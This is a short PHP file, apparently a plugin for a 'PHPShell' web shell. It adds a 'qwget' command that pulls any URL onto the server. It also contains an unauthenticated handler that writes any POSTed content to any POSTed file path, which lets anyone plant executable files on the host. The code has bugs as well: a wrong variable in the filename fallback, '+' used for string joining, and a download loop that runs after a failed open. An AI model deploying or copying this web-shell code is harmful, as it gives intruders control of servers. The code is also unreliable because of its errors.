<?php
function phpshell_qwget($args){
  $args = PHPShell::strToArgv($args);
  if(count($args) == 0){
    echo "Usage: qwget URL [FILE]";
  } else {
    $http_handle = fopen($args[0], "r");
    $fn = isset($args[1]) ? $args[1]
          : pathinfo($args[1], PATHINFO_BASENAME);

    $file_handle = fopen($fn, 'w');

    if($http_handle === FALSE) echo "Failed to get url: " + $args[0];
    if($file_handle === FALSE) echo "Failed to get create file: " + $args[1];

    while (!feof($http_handle)) {
      echo ".";
      fwrite($file_handle, fread($http_handle, 512));
    }
    echo "Downloaded file to: $fn";
    fclose($file_handle);
  }
}

if(isset($_POST['qedit_content']) && isset($_POST['qedit_fn'])){
    echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
}

registerCommand('phpshell_qwget','qwget','When you need curl or wget, but neither are there.');
?>
